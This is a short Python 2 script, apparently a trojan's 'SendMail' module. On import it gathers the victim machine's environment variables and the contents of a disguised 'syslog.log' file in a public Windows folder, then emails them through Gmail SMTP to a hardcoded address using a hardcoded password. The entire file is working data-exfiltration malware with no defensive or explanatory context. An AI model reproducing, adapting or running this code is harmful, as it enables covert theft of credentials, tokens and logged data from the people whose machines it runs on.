
from email.mime.multipart import MIMEMultipart
from email.MIMEImage import MIMEImage
from email.mime.text import MIMEText
import smtplib
import os

mailServer = "smtp.gmail.com"
message = str(os.environ)
filePath = "C:\\Users\\Public\\Libraries\\syslog.log"

def run(**args):
	print("[*] In SendMail module.")
	# create message object instance
	msg = MIMEMultipart()
	# setup the parameters of the message
	password = "wdulvhbwl1255" 
	msg['From'] = "timetpaywhatudid@gmail.com" 
	msg['To'] = "timetpaywhatudid@gmail.com"
	msg['Subject'] = "Samara_git"
	# add in the message body
	msg.attach(MIMEText(message, 'plain'))
	# attach image to message body
	msg.attach(MIMEText(file(filePath).read()))
	#create server
	server = smtplib.SMTP(mailServer,587)
	server.starttls()
	# Login Credentials for sending the mail
	server.login(msg['From'], password)

	# send the message via the server.
	server.sendmail(msg['From'], msg['To'], msg.as_string())
	server.quit()
	print "successfully sent email to %s:" % (msg['To'])
	return "successfully sent email to %s:" % (msg['To'])

run()
